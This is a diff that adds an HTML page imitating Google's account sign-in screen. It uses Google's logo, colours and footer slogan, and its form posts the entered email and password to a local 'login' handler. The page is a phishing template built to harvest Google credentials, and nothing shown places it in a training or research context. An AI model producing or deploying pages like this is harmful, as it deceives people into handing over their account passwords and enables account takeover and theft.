@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in – Google accounts</title>
+  <style>
+    body {background:#f2f2f2; font-family:Roboto,Arial,sans-serif;}
+    .center {max-width:350px; margin:80px auto; background:#fff; border-radius:7px; padding:30px 40px; box-shadow:0 3px 18px #2222;}
+    img {display:block; margin:0 auto 15px auto;}
+    h1 {font-size:22px; font-weight:400; text-align:center;}
+    input {width:100%; padding:10px; margin:8px 0 18px 0; border:1px solid #ccc; border-radius:2px;}
+    button {width:100%; background:#1a73e8; color:#fff; border:none; border-radius:2px; font-size:15px; padding:10px;}
+    .foot {color:#aaa; text-align:center; margin-top:10px;}
+  </style>
+</head>
+<body>
+  <div class="center">
+    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" width="80">
+    <h1>Sign in</h1>
+    <form method="POST" action="login">
+      <input type="text" name="username" placeholder="Email or phone" required>
+      <input type="password" name="password" placeholder="Enter your password" required>
+      <button type="submit">Next</button>
+    </form>
+    <div class="foot">One Google Account for everything Google</div>
+  </div>
+</body>
+</html>
